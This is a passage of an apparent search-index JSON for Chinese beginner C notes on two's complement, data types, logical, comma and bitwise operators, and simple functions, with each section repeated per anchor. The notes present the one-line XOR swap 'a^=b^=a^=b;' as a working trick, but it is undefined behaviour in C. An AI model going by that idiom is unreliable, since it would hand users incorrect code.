原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#sizeof"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#补码"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#unsigned"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数越界"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数的输入输出"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#八进制和十六进制"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数类型的选择"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#浮点类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#科学计数法"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#输出小数"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#宽度限定词"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#超过范围的浮点数"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#浮点运算的精度"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#选择浮点类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符的输入输出"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#getchar"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#putchar"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符计算"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#大小写转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逃逸字符"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#自动类型转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#强制类型转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数的类型转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#bool"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include\u003cstdio.h\u003e int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#62逻辑运算"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#如何判断一个字符c是否是大写字母"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#优先级"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#短路"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#条件运算符"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌套条件表达式"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逗号运算符"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#位运算"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include \u003cstdio.h\u003e //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include\u003cstdio.h\u003e int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#71函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求和函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#什么是函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#调用函数"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#从函数中返回值"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#return的作用"},{"categories":["Programing"],"content":"\r7.1函数\r求和函数 #include //求和函数 void sum(int begin, int end) { int i; int sum = 0; for (i = begin; i \u003c= end; i++) { sum += i; } printf(\"%d到%d的和是%d\\n\", 